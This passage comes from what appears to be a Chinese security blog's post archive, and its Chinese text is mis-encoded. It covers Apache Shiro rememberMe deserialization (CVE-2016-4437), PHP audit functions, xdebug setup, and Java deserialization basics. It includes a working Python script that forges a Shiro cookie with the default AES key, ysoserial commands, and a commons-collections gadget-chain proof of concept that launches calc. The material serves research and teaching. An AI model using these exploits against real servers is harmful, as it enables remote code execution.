å¯†ï¼Œå¯†é’¥ä¸ºå¸¸é‡ base64 ç¼–ç  è®¾ç½®åˆ° cookie ä¸­çš„ rememberme å­—æ®µ è§£å¯†è¿‡ç¨‹ åœ¨ org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity æ·»åŠ æ–­ç‚¹ï¼Œç„¶åå‘é€ä¸€ä¸ªå¸¦æœ‰ readmemberMe cookieçš„è¯·æ±‚ã€‚ è·Ÿè¿›å‡½æ•° getRememberedPrincipalsorg.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals è°ƒç”¨ getRememberedSerializedIdentity é’ˆå¯¹httpè¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¿› getRememberedSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity getCookie æ„é€ æ–¹æ³•å…ˆè·å– cookie ä¿¡æ¯,readValue æ–¹æ³•ï¼Œæ ¹æ® Cookie ä¸­çš„ name å­—æ®µè·å– Cookie çš„å€¼ï¼Œç„¶åè¿”å› Cookie çš„å€¼ ç„¶åè°ƒç”¨ byte[] decoded = Base64.decode(base64)å¤„ç† base64 åŠ å¯†çš„ Cookie ä¿¡æ¯ï¼Œå¹¶ä¸”å°†è¿™ä¸ª Cookie è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—èŠ‚ç  å›åˆ° getRememberedPrincipalsï¼Œç»§ç»­è·Ÿè¿› convertBytesToPrincipals å‡½æ•°org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals AES è§£å¯† org.apache.shiro.mgt.AbstractRememberMeManager#decrypt ååºåˆ—åŒ– org.apache.shiro.mgt.AbstractRememberMeManager#deserializeorg.apache.shiro.io.DefaultSerializer#deserializeçœ‹åˆ° readObject() å½“æˆ‘ä»¬å‘é€å¸¦æœ‰ readmemberMe cookieçš„è¯·æ±‚ï¼Œåç«¯ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œã€‚ è¯»å– cookie ä¸­ rememberMe çš„å€¼ base64 è§£ç  è¿›è¡Œ AES è§£å¯†ï¼Œå¯†é’¥ä¸ºå¸¸é‡ ååºåˆ—åŒ– 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3# coding:utf-8from Crypto.Cipher import AESimport tracebackimport requestsimport subprocessimport uuidimport base64target = \"http://localhost:8080/samples_web_war/\"jar_file = 'F:\\\\Penetration\\\\ysoserial\\\\ysoserial-0.0.6-SNAPSHOT-all.jar'cipher_key = \"kPH+bIxk5D2deZiIxcaaaA==\"# åˆ›å»º remembermeçš„å€¼popen = subprocess.Popen(['java','-jar',jar_file, \"URLDNS\", \"http://7zhfmm.dnslog.cn\"], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# å‘é€requesttry: r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)except: traceback.print_exc() æ¼æ´åˆ©ç”¨ commons-collections 3.2.1 shiroè‡ªå¸¦çš„commons-collections-3.2.1 ã€commons-beanutils-1.8.3 åœ¨JDK1.8u112ä¸­ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ ysoserial ä¸­çš„Commons-Collections5ï¼ˆ3.1-3.2.1ï¼Œjdk1.8ï¼‰ 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"clac\" ä¼šæŠ¥é”™æç¤º org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array. å›åˆ° org.apache.shiro.io.DefaultSerializer#deserialize æˆ‘ä»¬å‘ç°åœ¨è¿™é‡Œä½¿ç”¨äº† ClassResolvingObjectInputStream ç±»è€Œéä¼ ç»Ÿçš„ ObjectInputStream org.apache.shiro.io.ClassResolvingObjectInputStream#resolveClass java.io.ObjectInputStream#resolveClass ObjectInputStream çš„ resolveClass å‡½æ•°ç”¨çš„æ˜¯Class.forName ç±»è·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ shiro ä¸­ ClassResolvingObjectInputStream ç»§æ‰¿äº† ObjectInputStreamï¼ŒresolveClass è¢«é‡å†™ï¼Œè°ƒç”¨äº† ClassUtils.forName è·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ org.apache.shiro.util.ClassUtils#forName çœ‹ä¸€ä¸‹ ExceptionIgnoringAccessor æ˜¯å¦‚ä½•æ˜¯å®ç°çš„org.apache.shiro.util.ClassUtils.ExceptionIgnoringAccessor commons-collections 4.0 å‚è€ƒæ–‡ç«  Apache Shiro Javaååºåˆ—åŒ–æ¼æ´åˆ†æShiro 1.2.4 RememberMeååºåˆ—åŒ–æ¼æ´è¸©å‘åˆ†æ(CVE-2016-4437)Pwn a CTF Platform with Java JRMP Gadget document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"ç›¸å…³å‡½æ•°æ€»ç»“","slug":"ç›¸å…³å‡½æ•°æ€»ç»“","date":"2020-08-20T13:31:50.000Z","updated":"2020-09-22T11:46:45.522Z","comments":true,"path":"2020/08/20/ç›¸å…³å‡½æ•°æ€»ç»“/","link":"","permalink":"http://yoursite.com/2020/08/20/%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"PHP ç›¸å…³å‡½æ•°","text":"PHP ç›¸å…³å‡½æ•° å®¡è®¡åˆ©ç”¨å‡½æ•° var_dump() var_dump() å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚ ä»»æ„æ–‡ä»¶ä¸‹è½½ fread() fread() å‡½æ•°è¯»å–æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰fread(file,length) å‚æ•° æè¿° file å¿…éœ€ã€‚è§„å®šè¦è¯»å–æ‰“å¼€æ–‡ä»¶ã€‚ length å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚ 123456789101112131415$path = \"../{$file}\";$handle = fopen($path, \"r\");header(\"Pragma: \");header(\"Cache-Control: \");header(\"Content-type: application/octet-stream; charset=utf-8\");header(\"Content-Disposition: attachment; filename=\\\"{$name}\\\"\");if ($handle) { while (!feof($handle)) { $read = fread($handle, 4096); print($read); }}pclose($handle); å˜é‡è¦†ç›– extrat() extract() ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ å‘½ä»¤æ‰§è¡Œ call_user_func_array() call_user_func_array(â€œsystemâ€,[â€œwhoamiâ€]); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•","slug":"phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•","date":"2020-08-20T07:19:41.000Z","updated":"2020-09-22T11:46:45.491Z","comments":true,"path":"2020/08/20/phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•/","link":"","permalink":"http://yoursite.com/2020/08/20/phpstorm%E8%BF%9B%E8%A1%8CPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/","excerpt":"é…ç½®ç¯å¢ƒ phpstromphpstudy","text":"é…ç½®ç¯å¢ƒ phpstromphpstudy phpstrom é…ç½® php ç¯å¢ƒ PHPå®‰è£…xdebugæ‰©å±• æ³¨æ„ç‰ˆæœ¬ï¼šæ­¤æ—¶æˆ‘ä»¬ php çš„ç‰ˆæœ¬ä¸º php5.6.9xdebugæ¨¡å—https://xdebug.org/files/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll æŠŠä¸‹è½½æˆåŠŸçš„ php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dllæ”¾åœ¨ E:\\Tools\\phpstudy_pro\\Extensions\\php\\php5.6.9nts\\ext æ–‡ä»¶å¤¹ä¸‹ åŒæ—¶åœ¨ php.ini ä¸­æ·»åŠ å¦‚ä¸‹é…ç½® 12345678910111213[xdebug]zend_extension=\"E:/Tools/phpstudy_pro/Extensions/php/php5.6.9nts/ext/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll\" ;æŒ‡å®šXdebugæ‰©å±•æ–‡ä»¶çš„ç»å¯¹è·¯å¾„xdebug.auto_trace=on ;å¯ç”¨ä»£ç è‡ªåŠ¨è·Ÿè¸ªxdebug.collect_params=on ;å…è®¸æ”¶é›†ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°å˜é‡xdebug.collect_return=on ;å…è®¸æ”¶é›†å‡½æ•°è°ƒç”¨çš„è¿”å›å€¼xdebug.trace_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;æŒ‡å®šå †æ ˆè·Ÿè¸ªæ–‡ä»¶çš„å­˜æ”¾ç›®å½•xdebug.profiler_enable=on ;æ˜¯å¦å¯ç”¨Xdebugçš„æ€§èƒ½åˆ†æï¼Œå¹¶åˆ›å»ºæ€§èƒ½ä¿¡æ¯æ–‡ä»¶xdebug.profiler_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;æŒ‡å®šæ€§èƒ½åˆ†æä¿¡æ¯æ–‡ä»¶çš„è¾“å‡ºç›®å½•xdebug.remote_enable = on ;æ˜¯å¦å¼€å¯è¿œç¨‹è°ƒè¯•xdebug.remote_handler = dbgp ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„å¤„ç†åè®®xdebug.remote_host= localhost ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„ä¸»æœºåxdebug.remote_port = 9000 ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„ç«¯å£å·xdebug.idekey = PHPSTORM ;æŒ‡å®šä¼ é€’ç»™DBGpè°ƒè¯•å™¨å¤„ç†ç¨‹åºçš„IDE Key PHPStrom é…ç½® debug ç¯å¢ƒ é…ç½® Debug ç«¯å£ é…ç½®IDEKEY é…ç½®Server é…ç½®PHP Web Application æµè§ˆå™¨çš„xdebugæ’ä»¶ æµ‹è¯•è°ƒè¯• åŠ ä¸Šæ–­ç‚¹ï¼ŒåŒæ—¶æŠŠå°ç”µè¯è®¾ç½®æˆä¸ºç»¿è‰²çš„æµè§ˆå™¨ä¸Šçš„æ’ä»¶æ‰“å¼€ï¼ŒåŒæ—¶è®¿é—®è¦è°ƒè¯•çš„é¡µé¢ è°ƒè¯•å•ä¸ªæ–‡ä»¶ è°ƒè¯•å•ä¸ªæ–‡ä»¶æ—¶ é…ç½®PHP Web Applicationç‚¹å‡»ç»¿è‰²çš„å°è™«å­å°±å¯ä»¥è¿›è¡Œè°ƒè¯•äº† å°±å¯ä»¥è¿›è¡Œæ„‰å¿«çš„è°ƒå¼äº†ï¼ åœ¨è¿›è¡Œè°ƒè¯•æ—¶ï¼Œç»å¸¸é‡åˆ°è¿™ä¸ªé—®é¢˜,xdebugæ–­æ‰è°ƒè¯•ç»å¸¸æ— æ•…æ–­å¼€ å¦‚æœé’ˆå¯¹æŸä¸€ä¸ªé¡¹ç›®å¯ä»¥å¯¹é¡¹ç›®çš„é…ç½®æ–‡ä»¶ vhosts.conf ä¸­æ·»åŠ  12IPCConnectTimeout 3000IPCCommTimeout 3000 è¦å¯¹æ‰€æœ‰é¡¹ç›®éƒ½è¿›è¡Œé…ç½®æ—¶ï¼Œå¯ä»¥ä¿®æ”¹httpd.conf document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"åˆè¯†Java ååºåˆ—åŒ–","slug":"åˆè¯†Javaååºåˆ—åŒ–","date":"2020-08-16T13:31:50.000Z","updated":"2020-09-22T11:46:45.522Z","comments":true,"path":"2020/08/16/åˆè¯†Javaååºåˆ—åŒ–/","link":"","permalink":"http://yoursite.com/2020/08/16/%E5%88%9D%E8%AF%86Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"åˆè¯†Java ååºåˆ—åŒ– What ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ– java åºåˆ—åŒ–å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆJVMè®¤è¯†çš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­åŒ…å«äº†å¯¹è±¡çš„æ•°æ®ï¼Œä¸»è¦ä»¥å¯¹è±¡å±æ€§ä¸ºä¸»ã€‚ java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚åˆ©ç”¨åœ¨Aå¹³å°ä¸Šåºåˆ—åŒ–äº§ç”Ÿçš„å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥åœ¨Bå¹³å°ä¸Šååºåˆ—åŒ–å‡ºåŒæ ·çš„å¯¹è±¡ã€‚","text":"åˆè¯†Java ååºåˆ—åŒ– What ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ– java åºåˆ—åŒ–å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆJVMè®¤è¯†çš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­åŒ…å«äº†å¯¹è±¡çš„æ•°æ®ï¼Œä¸»è¦ä»¥å¯¹è±¡å±æ€§ä¸ºä¸»ã€‚ java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚åˆ©ç”¨åœ¨Aå¹³å°ä¸Šåºåˆ—åŒ–äº§ç”Ÿçš„å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥åœ¨Bå¹³å°ä¸Šååºåˆ—åŒ–å‡ºåŒæ ·çš„å¯¹è±¡ã€‚ Why ä¸ºä»€ä¹ˆè¦ç”¨åºåˆ—åŒ–ä¸ååºåˆ—åŒ– å®ç°äº†æ•°æ®çš„æŒä¹…åŒ–ï¼Œé€šè¿‡åºåˆ—åŒ–å¯ä»¥æŠŠæ•°æ®æ°¸ä¹…çš„ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šã€‚ åˆ©ç”¨åºåˆ—åŒ–å®ç°è¿œç¨‹é€šä¿¡ï¼Œå³åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚ How å¦‚ä½•å®ç°åºåˆ—åŒ–ä¸ååºåˆ—åŒ– JDKç±»åº“ä¸­åºåˆ—åŒ–API ä½¿ç”¨åˆ°JDKä¸­å…³é”®ç±» ObjectOutputStream(å¯¹è±¡è¾“å‡ºæµ) å’ŒObjectInputStream(å¯¹è±¡è¾“å…¥æµ) ObjectOutputStream ç±»ä¸­ï¼šé€šè¿‡ä½¿ç”¨ writeObject(Object object) æ–¹æ³•ï¼Œå°†å¯¹è±¡ä»¥äºŒè¿›åˆ¶æ ¼å¼è¿›è¡Œå†™å…¥ã€‚ ObjectInputStream ç±»ä¸­ï¼šé€šè¿‡ä½¿ç”¨ readObjectï¼ˆï¼‰æ–¹æ³•ï¼Œä»è¾“å…¥æµä¸­è¯»å–äºŒè¿›åˆ¶æµï¼Œè½¬æ¢æˆå¯¹è±¡ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ è¢«åºåˆ—åŒ–çš„ç±»å¿…é¡»è¦å®ç° Serializable æ¥å£ï¼Œå¦åˆ™å°†æ— æ³•åºåˆ—åŒ–å¯¹è±¡ã€‚ 1234public class User implements Serializable { public String name; public int age;} 12345678910111213141516public class Main { public static void main(String[] args) throws IOException { User user =new User(); user.age = 18; user.name = \"whippet\"; PrintStream out = System.out; ObjectOutputStream objectOutputStream = new ObjectOutputStream(out); objectOutputStream.writeObject(user); objectOutputStream.flush(); objectOutputStream.close(); }} åºåˆ—åŒ–å¯¹è±¡æ—¶ä½¿ç”¨å¯¹è±¡è¾“å‡ºæµâ€ObjectOutputStreamâ€ï¼Œå¾€æŒ‡å®šè¾“å‡ºæµé‡Œå†™å…¥ User å¯¹è±¡ï¼Œä½¿ç”¨æ§åˆ¶å°ï¼Œå¯ä»¥ç›´è§‚çš„çœ‹åˆ°å¯¹è±¡åºåˆ—åŒ–åçš„æ ·å­ã€‚ ï¿½ï¿½ \u0005sr Simple.Userï¿½ï¿½Gm|\u0007X\u001d\u0002 \u0002I \u0003ageL \u0004namet \u0012Ljava/lang/String;xp \u0012t \u0007whippet ååºåˆ—åŒ–å¯¹è±¡ å°†å¯¹è±¡åºåˆ—åŒ–æˆbyteæ•°ç»„ã€‚å†ç”¨â€ObjectInputStreamâ€ååºåˆ—åŒ–å›æ¥ã€‚ 12345678910111213141516171819202122232425262728public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { User user =new User(); user.age = 18; user.name = \"whippet\"; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//ç”¨äºå­˜æ”¾personå¯¹è±¡åºåˆ—åŒ–byteæ•°ç»„çš„è¾“å‡ºæµ ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(user);//åºåˆ—åŒ–å¯¹è±¡ objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //è¯»å–åºåˆ—åŒ–åçš„å¯¹è±¡byteæ•°ç»„ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//å­˜æ”¾byteæ•°ç»„çš„è¾“å…¥æµ ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); //å°†byteæ•°ç»„è¾“å…¥æµååºåˆ—åŒ– System.out.println(o); }} è¾“å‡ºè¿™ä¸ªååºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œå’Œä¸€å¼€å§‹ä¸º User å¯¹è±¡è®¾å®šçš„å±æ€§å€¼å®Œå…¨ç›¸åŒã€‚åŒæ—¶Javaä¸ºæˆ‘ä»¬æä¾›äº†è‡ªå®šä¹‰writeObject()ã€readObject()æ–¹æ³•çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åœ¨ç›®æ ‡ç±»ä¸­è‡ªå®šä¹‰writeObject()ã€readObject()æ–¹æ³•ä¹‹åï¼Œå°†ä¼šé¦–å…ˆè°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„æ–¹æ³•ï¼Œç„¶ååœ¨ç»§ç»­æ‰§è¡ŒåŸæœ‰çš„æ–¹æ³•æ­¥éª¤. 1234567891011121314151617181920public class User implements Serializable { public String name; public int age; @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException { Runtime.getRuntime().exec(\"calc\"); }} User ç±»å†™ä¸€ä¸ª readObject æ–¹æ³•ä¸Šå»ï¼Œå½“å¯¹è±¡è¢«ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¯¥æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ã€‚ åºåˆ—åŒ–æ—¶ä»…èƒ½åºåˆ—åŒ–å¯¹è±¡çš„å±æ€§ï¼Œå¹¶ä¸èƒ½æ§åˆ¶æ–¹æ³•ä¸­çš„reObjectçš„ä»£ç ï¼Œæ‰€æœ‰æ¼æ´çš„æ„é€ éœ€è¦å¼•å…¥æ–°çš„jaråŒ… commons-collections-3.1ååºåˆ—åŒ–æ¼æ´ æ¼æ´åˆ©ç”¨ åˆ©ç”¨maven å®‰è£…ä¾èµ– 12345678&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Pocexec { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //è§¦å‘æ¼æ´ Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\"); }} æ¼æ´åˆ†æ java.lang.Runtime#exec(java.lang.String)åœ¨execå¤„æ·»åŠ æ–­ç‚¹ æŸ¥çœ‹è°ƒç”¨é“¾ æœ€ç»ˆéå†äº†â€outerMapâ€è¿™ä¸ªMapå¯¹è±¡çš„ Entry é›†åˆï¼Œç„¶åæ‰§è¡Œäº† Entry å¯¹è±¡çš„çš„ setValue æ–¹æ³•å¯¼è‡´æ‰§è¡Œäº†åå°„é“¾ã€‚æ‰€ä»¥å…ˆæŸ¥çœ‹ outerMap çš„å®ç°ç±» Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); è°ƒç”¨äº†æ–¹æ³•org.apache.commons.collections.map.TransformedMap#decorateè¿™ä¸ªé™æ€æ–¹æ³•åˆå»newäº†ä¸€ä¸ªTransformedMapå¯¹è±¡ã€‚mapä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ™®é€šçš„æ•°æ®ï¼ŒvalueTransformeråˆ™æ˜¯æ„é€ çš„è°ƒç”¨é“¾ã€‚org.apache.commons.collections.map.TransformedMap#TransformedMapå®ä¾‹åŒ–å¯¹è±¡æˆåŠŸåä¾æ¬¡è°ƒç”¨äº†å››ä¸ªæ–¹æ³• entrySet() iterator() next() setValue() åœ¨ç±» TransformedMapä¸­æœªæ‰¾åˆ°å®šä¹‰çš„ entrySet()æ–¹æ³•ï¼Œåœ¨ä»–çš„çˆ¶ç±»AbstractInputCheckedMapDecorator ä¸­æ‰¾org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#entrySetnew äº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetEntrySetç±»ä¸­çš„iteratoræ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iteratoråˆnewäº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIteratorEntrySetIteratorç±»ä¸­çš„nextæ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#nextåˆnewäº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntryMapEntryç±»ä¸­çš„setValueæ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValueç¬¬ä¸€è¡Œè°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œæ­¤å¤„çš„parentæ¥è‡ªæ‰€ä»¥å®é™…ä¸Šè°ƒç”¨ä¸º org.apache.commons.collections.map.TransformedMap#checkSetValueè°ƒç”¨äº†valueTransformer çš„transformæ–¹æ³•æ‰€ä»¥é¦–å…ˆè°ƒç”¨äº†org.apache.commons.collections.functors.ChainedTransformer#transformå¾ªç¯è°ƒç”¨æ•°ç»„æ¯ä¸€ä¸ªå¯¹è±¡çš„transformæ–¹æ³•ï¼Œå¹¶ä¼ å…¥objectå¯¹è±¡ï¼Œå†å°†æ‰§è¡Œç»“æœèµ‹å€¼ç»™objectå¯¹è±¡[0]æ˜¯ConstantTransformerå¯¹è±¡ï¼Œå®ƒä¼šè¿”å›newæ—¶å€™çš„å‚æ•°ä¸­çš„Objectå¯¹è±¡ï¼Œè¿™é‡Œä¹Ÿæ˜¯å°±æ˜¯â€java.Runtimeâ€[1]-[3]æ˜¯InvokerTransformerå¯¹è±¡ï¼Œè°ƒç”¨çš„æ˜¯åå°„çš„ä»£ç  iTransformersçš„å€¼æ˜¯åœ¨åˆå§‹åŒ–æ„å»ºChainedTransformeræ—¶ç”Ÿæˆorg.apache.commons.collections.functors.ChainedTransformer#ChainedTransformerConstantTransformerç±»ä¸­å®ç°transformæ–¹æ³•org.apache.commons.collections.functors.ConstantTransformer#transformInvokerTransformerç±»ä¸­å®ç°äº†transformæ–¹æ³•org.apache.commons.collections.functors.InvokerTransformer#transform 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } (â€œgetMethodâ€, new Class[] {String.class, Class[].class }, new Object[] {â€œgetRuntimeâ€, new Class[0] })iMethodName = â€œgetMethodâ€;iParamTypes = new Class[] {String.class, Class[].class } ;iArgs = new Object[] {â€œgetRuntimeâ€, new Class[0] } 123456789101112public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } ......} ç¬¬ä¸€ä¸ªå‚æ•°â€getMethodâ€æ˜¯è¿™ä¸ªå‡½æ•°çš„åå­— ç¬¬äºŒä¸ªå‚æ•°new Class[]{String.class, Class[].class}æ˜¯getMethodçš„2ä¸ªå‚æ•°å‚æ•°ç±»å‹ï¼Œä¸€ä¸ªæ˜¯Stringï¼Œä¸€ä¸ªæ˜¯class[] ç¬¬ä¸‰ä¸ªå‚æ•°new Object[]{â€œgetRuntimeâ€, new Class[0]}æ˜¯getMethodçš„2ä¸ªå‚æ•°å€¼ï¼Œä¸€ä¸ªæ˜¯getRuntimeï¼Œä¸€ä¸ªæ˜¯ç©ºï¼Œå› ä¸ºæ˜¯æ•°ç»„å½¢å¼æ‰€ä»¥è¦è¿™ä¹ˆå†™ getMethod(&lt;String&gt; â€œgetRuntimeâ€, &lt;Class[]&gt; null)invoke(&lt;Object&gt;null, &lt;Object[]&gt;null)exec(&lt;String&gt;â€œâ€calc.exeâ€â€) å°±æ˜¯é€šè¿‡åå°„å»è°ƒç”¨Runtime.getRuntime().exec(â€œcalc.exeâ€) Javaåå°„æœºåˆ¶ javaä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime.getRuntime().exec(\"calc\"); }} æ­£å¸¸çš„æ‰§è¡Œæ­¥éª¤ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime runtime = Runtime.getRuntime(); runtime.exec(\"calc\"); } } ç›¸å¯¹åº”çš„åå°„ä»£ç ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); }} Method Class.getMethod(String name, Class&lt;?&gt;â€¦ parameterTypes)çš„ä½œç”¨æ˜¯è·å¾—å¯¹è±¡æ‰€å£°æ˜çš„å…¬å¼€æ–¹æ³•ã€‚è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°nameæ˜¯è¦è·å¾—æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°parameterTypesæ˜¯æŒ‰å£°æ˜é¡ºåºæ ‡è¯†è¯¥æ–¹æ³•å½¢å‚ç±»å‹ã€‚ getMethod(æ–¹æ³•å, æ–¹æ³•ç±»å‹)Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null);ç­‰ä»·äºObject runtime = java.lang.Runtime.getRuntime() person.getClass().getMethod(â€œSpeakâ€, null);è·å¾—personå¯¹è±¡çš„Speakæ–¹æ³•ï¼Œå› 